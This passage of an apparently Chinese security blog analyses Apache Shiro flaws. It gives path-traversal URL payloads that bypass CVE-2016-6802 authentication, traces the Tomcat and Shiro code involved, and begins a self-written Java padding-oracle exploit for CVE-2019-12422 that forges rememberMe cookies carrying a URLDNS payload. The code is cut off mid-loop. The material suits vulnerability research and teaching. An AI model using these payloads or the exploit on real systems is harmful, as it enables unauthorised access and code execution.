class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>具体配置可以参考我的github，改自p神的shirodemo。</p>
<p>项目结构树：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">  ├─main</span><br><span class="line">  │  ├─java</span><br><span class="line">  │  │  └─webapp</span><br><span class="line">  │  │      │  index.jsp</span><br><span class="line">  │  │      │  login.jsp</span><br><span class="line">  │  │      │  </span><br><span class="line">  │  │      └─WEB-INF</span><br><span class="line">  │  │              shiro.ini</span><br><span class="line">  │  │              web.xml</span><br><span class="line">  │  │              </span><br><span class="line">  │  └─resources</span><br><span class="line">  └─test</span><br></pre></td></tr></table></figure>

<p>打包</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241119123338381.png" alt="image-20241119123338381"></p>
<p>使用Tomcat启动即可，需要设置应用程序根路径，我们设置的是&#x2F;CVE_2016_6802_war_exploded</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241119123424271.png" alt="image-20241119123424271"></p>
<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>我们尝试访问需要鉴权的页面index.jsp，会302跳转到登录页面让我们登录对应权限。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241119124712189.png" alt="image-20241119124712189"></p>
<p>我们使用漏洞poc发送请求，也就是在请求url前面加上&#x2F;xxx&#x2F;..(xxx随意填写)，可以看到我们没有权限却可以访问需要权限的页面。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241119124907046.png" alt="image-20241119124907046"></p>
<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞核心位置是一个很熟悉的地方，<code>org.apache.shiro.web.util.WebUtils#getPathWithinApplication</code>:</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241119150439820.png" alt="image-20241119150439820"></p>
<p>该函数用于获取请求路径在应用内的相对路径：</p>
<ol start="6">
<li>获取请求的上下文路径（<code>contextPath</code>）和请求URI（<code>requestUri</code>）。</li>
<li>检查<code>requestUri</code>是否以<code>contextPath</code>开头：<ul>
<li>如果是，则去掉<code>contextPath</code>部分，返回剩余路径；如果没有剩余路径，则返回<code>/</code>。</li>
<li>如果不是，则直接返回<code>requestUri</code>。</li>
</ul>
</li>
</ol>
<p>可以看到按照POC发送url请求，上下文路径<code>contextPath</code>是<code>/cmisl/../CVE_2016_6802_war_exploded</code>，请求 URI <code>requestUri</code>是<code>/CVE_2016_6802_war_exploded/index.jsp</code>，显然<code>requestUri</code>并不是以<code>contextPath</code>开头，因此进入else直接返回requestUri，也就是直接返回了<code>/CVE_2016_6802_war_exploded/index.jsp</code>。</p>
<p>一直返回到<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241119224725166.png" alt="image-20241119224725166"></p>
<p>可以看到我们过滤器匹配的路径是&#x2F;index.jsp，与返回来的&#x2F;CVE_2016_6802_war_exploded&#x2F;index.jsp匹配不上，所以这次请求不会经过权限检查的过滤器。所以可以访问到原本需要权限的资源。</p>
<h5 id="contextPath问题"><a href="#contextPath问题" class="headerlink" title="contextPath问题"></a>contextPath问题</h5><p>那么为什么上下文路径<code>contextPath</code>是<code>/cmisl/../CVE_2016_6802_war_exploded</code>呢？</p>
<p>这里主要就是tomcat代码的问题了。我们可以跟进获取contextPath的方法getContextPath。一直跟进到<code>org.apache.catalina.connector.Request#getContextPath</code></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241120020943374.png" alt="image-20241120020943374"></p>
<p>因为我们设置Tomcat服务器时，设置的应用程序根路径是&#x2F;CVE_2016_6802_war_exploded，所以lastSlash(代表斜杠数目)的值为1。</p>
<p>然后会经过多重斜杠检查，我们可以跳过直接看造成漏洞的关键部分。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241120024802336.png" alt="image-20241120024802336"></p>
<p>首先匹配<code>canonicalContextPath</code>和<code>candidate</code>，也就是匹配程序根路径<code>/CVE_2016_6802_war_exploded</code>和取出来第一个斜杠所对应的路径<code>/cmisl</code>。</p>
<p>发现匹配不上，于是会加上第二个斜杠所对应的路径，也就是<code>/cmisl/..</code>，匹配之前规范化，变成<code>/</code>。</p>
<p>发现<code>/</code>和<code>/CVE_2016_6802_war_exploded</code>匹配不上。在加上第三个斜杠对应的路径，<code>/cmisl/../CVE_2016_6802_war_exploded</code>，匹配前规范化变成<code>/CVE_2016_6802_war_exploded</code>。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241120125423748.png" alt="image-20241120125423748"></p>
<p>此时规范化后的路径<code>/CVE_2016_6802_war_exploded</code>就和程序根路径<code>/CVE_2016_6802_war_exploded</code>匹配上了。</p>
<p>匹配上之后，就会返回从开始到第三个斜杠对应的路径，额就是<code>/cmisl/../CVE_2016_6802_war_exploded</code>，返回这个作为上下文路径<code>contextPath</code>。</p>
<h5 id="另一种绕过"><a href="#另一种绕过" class="headerlink" title="另一种绕过"></a>另一种绕过</h5><p>参考：<a target="_blank" rel="noopener" href="https://drun1baby.top/2023/03/16/Java-Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#%E8%87%AA%E5%B7%B1%E5%8F%91%E7%8E%B0%E7%9A%84-bypass-%E7%9A%84%E5%88%86%E6%9E%90%EF%BC%8C%E5%90%8C%E6%97%B6%E4%B8%8D%E5%B8%A6-contextPath">Java Shiro 权限绕过多漏洞分析 | Drunkbaby’s Blog</a></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241120143803543.png" alt="image-20241120143803543"></p>
<p>可以看到<code>/;/CVE_2016_6802_war_exploded</code>经过<code>removePathParameters</code>函数之后变成<code>//CVE_2016_6802_war_exploded</code>，这个在后面规范化会变成<code>/CVE_2016_6802_war_exploded </code>而绕过。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241120144246681.png" alt="image-20241120144246681"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">removePathParameters</span><span class="params">(String input)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">nextSemiColon</span> <span class="operator">=</span> input.indexOf(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="comment">// Shortcut</span></span><br><span class="line">    <span class="keyword">if</span> (nextSemiColon == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(input.length());</span><br><span class="line">    result.append(input.substring(<span class="number">0</span>, nextSemiColon));</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">nextSlash</span> <span class="operator">=</span> input.indexOf(<span class="string">&#x27;/&#x27;</span>, nextSemiColon);</span><br><span class="line">        <span class="keyword">if</span> (nextSlash == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        nextSemiColon = input.indexOf(<span class="string">&#x27;;&#x27;</span>, nextSlash);</span><br><span class="line">        <span class="keyword">if</span> (nextSemiColon == -<span class="number">1</span>) &#123;</span><br><span class="line">            result.append(input.substring(nextSlash));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result.append(input.substring(nextSlash, nextSemiColon));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑如下：</p>
<ul>
<li>查找输入字符串中的第一个分号（<code>;</code>）。</li>
<li>如果没有找到分号，直接返回原始字符串。</li>
<li>如果找到了分号，则创建一个 <code>StringBuilder</code>，并将分号之前的部分添加到结果中。</li>
<li>然后，继续查找路径中从分号之后开始的部分，直到没有更多的路径分隔符（<code>/</code>）为止。</li>
<li>将找到的路径部分（不包含路径参数）添加到结果中。</li>
</ul>
<h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>使用了修复 CVE-2010-3863 时更新的路径标准化方法 <code>normalize</code> 来处理 Context Path 之后再返回。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241120133216046.png" alt="image-20241120133216046"></p>
<h3 id="CVE-2019-12422-Shiro-721反序列化漏洞"><a href="#CVE-2019-12422-Shiro-721反序列化漏洞" class="headerlink" title="CVE-2019-12422(Shiro-721反序列化漏洞)"></a>CVE-2019-12422(Shiro-721反序列化漏洞)</h3><blockquote>
<p>Apache Shiro before 1.4.2, when using the default “remember me” configuration, cookies could be susceptible to a padding attack.</p>
</blockquote>
<h4 id="漏洞信息-3"><a href="#漏洞信息-3" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>影响版本：<code>shiro &lt; 1.4.2</code></p>
<p>漏洞成因：<code>RememberMe</code>使用 <code>AES-128-CBC</code> 模式加密，易受<code>Padding Oracle Attack</code>攻击，攻击者可以构造<code>RememberMe Cookie</code> 值来实现反序列化漏洞攻击。</p>
<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e">Updates the default Cipher mode to GCM in AesCipherService · apache&#x2F;shiro@a801878</a></p>
<h4 id="漏洞环境-3"><a href="#漏洞环境-3" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>和CVE-2016-4437(Shiro-550反序列化漏洞)的环境类似，改一下依赖版本。同时添加一个运行exp时需要的依赖包处理http请求。因为我喜欢把exp和漏洞环境放在一块避免文件混乱。可以将exp和漏洞环境分</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--shiro--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--exp--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.httpcomponents<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>httpclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.5.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>参考网上的exp，编写了更为方便的java版本exp，为了方便测试用了爆破时间低的URLDNS链。根据自己的环境配置一下基本信息，运行即可获得可进行攻击的加密数据。</p>
<p>开始尝试java自带的HttpURLConnection进行http请求，发现会因为爆破次数太多，导致请求端口全部使用过，从而没有请求的端口资源了。但是HttpClient库可以解决这个问题。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl.exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.http.Header;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.NameValuePair;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.config.CookieSpecs;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.config.RequestConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.entity.UrlEncodedFormEntity;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.CloseableHttpResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.HttpGet;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.HttpPost;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.CloseableHttpClient;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.HttpClients;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.message.BasicNameValuePair;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroExploit</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> CloseableHttpClient HTTP_CLIENT;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DNSLOG</span> <span class="operator">=</span> <span class="string">&quot;http://dfnjhvngmh.dgrh3.cn&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">REQUEST_URL</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LOGIN_URL</span> <span class="operator">=</span> REQUEST_URL + <span class="string">&quot;/toLogin&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LOGIN_USERNAME</span> <span class="operator">=</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LOGIN_PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;admin123&quot;</span>;</span><br><span class="line"><span class="comment">//    private static final String EVIL_CODE_FILE_PATH = &quot;./CVE-2019-12422/src/main/java/cmisl/exp/URLDNS.ser&quot;;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BLOCK_SIZE</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] validData;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] evilCode;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> blockCount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">RequestConfig</span> <span class="variable">config</span> <span class="operator">=</span> RequestConfig.custom()</span><br><span class="line">                .setRedirectsEnabled(<span class="literal">false</span>)</span><br><span class="line">                .setCookieSpec(CookieSpecs.IGNORE_COOKIES)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        HTTP_CLIENT = HttpClients.custom()</span><br><span class="line">                .setDefaultRequestConfig(config)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            validData = obtainValidData(LOGIN_URL, LOGIN_USERNAME, LOGIN_PASSWORD);</span><br><span class="line"></span><br><span class="line"><span class="comment">//            evilCode = Files.readAllBytes(Paths.get(EVIL_CODE_FILE_PATH));</span></span><br><span class="line">            evilCode=getEvilCode(DNSLOG);</span><br><span class="line">            evilCode = applyPkcs7Padding(evilCode);</span><br><span class="line"></span><br><span class="line">            blockCount = evilCode.length / BLOCK_SIZE;</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] cipherText = generateCipherText();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;------------------------------------------------&quot;</span>);</span><br><span class="line">            System.out.println(Base64.encodeToString(cipherText));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] applyPkcs7Padding(<span class="type">byte</span>[] data) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">paddingLength</span> <span class="operator">=</span> BLOCK_SIZE - (data.length % BLOCK_SIZE);</span><br><span class="line">        <span class="type">byte</span>[] padding = <span class="keyword">new</span> <span class="title class_">byte</span>[paddingLength];</span><br><span class="line">        Arrays.fill(padding, (<span class="type">byte</span>) paddingLength);</span><br><span class="line">        <span class="keyword">return</span> concatenateArrays(data, padding);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isDecryptable</span><span class="params">(<span class="type">byte</span>[] paddingOracle)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">rememberMeValue</span> <span class="operator">=</span> Base64.encodeToString(concatenateArrays(validData, paddingOracle));</span><br><span class="line">        <span class="type">String</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="string">&quot;rememberMe=&quot;</span> + rememberMeValue;</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpGet</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(REQUEST_URL);</span><br><span class="line">        request.setHeader(<span class="string">&quot;Cookie&quot;</span>, cookie);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> HTTP_CLIENT.execute(request)) &#123;</span><br><span class="line">            <span class="keyword">return</span> !containsDeleteMe(response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">containsDeleteMe</span><span class="params">(CloseableHttpResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Header cookieHeader : response.getHeaders(<span class="string">&quot;Set-Cookie&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cookieHeader.getValue().contains(<span class="string">&quot;deleteMe&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] generateCipherText() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] cipherText = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] cn = computeCn(blockCount, <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>]);</span><br><span class="line">        cipherText = concatenateArrays(cn, cipherText);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] paddingOracle = concatenateArrays(<span class="keyword">new</span> <span class="title class_">byte</span>[BLOCK_SIZE], cn);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> blockCount - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">byte</span>[] ci = computeCn(i, paddingOracle);</span><br><span class="line">            cipherText = concatenateArrays(ci, cipherText);</span><br><span class="line">            paddingOracle = concatenateArrays(<span class="keyword">new</span> <span class="title class_">byte</span>[BLOCK_SIZE], ci);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cipherText;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] computeCn(<span class="type">int</span> n, <span class="type">byte</span>[] paddingOracle) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == blockCount) &#123;</span><br><span class="line">            <span class="type">byte</span>[] byteArray = <span class="keyword">new</span> <span class="title class_">byte</span>[BLOCK_SIZE];</span><br><span class="line">            Arrays.fill(byteArray, (<span class="type">byte</span>) <span class="number">0x78</span>);</span><br><span class="line">            <span class="keyword">return</span> byteArray;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] intermediateBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[BLOCK_SIZE];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> BLOCK_SIZE - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt;= <span class="number">0xFF</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (isDecryptable(paddingOracle)) &#123;</span><br><span class="line">                    intermediateBytes[i] = (<span class="type">byte</span>) (j ^ (BLOCK_SIZE - i));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                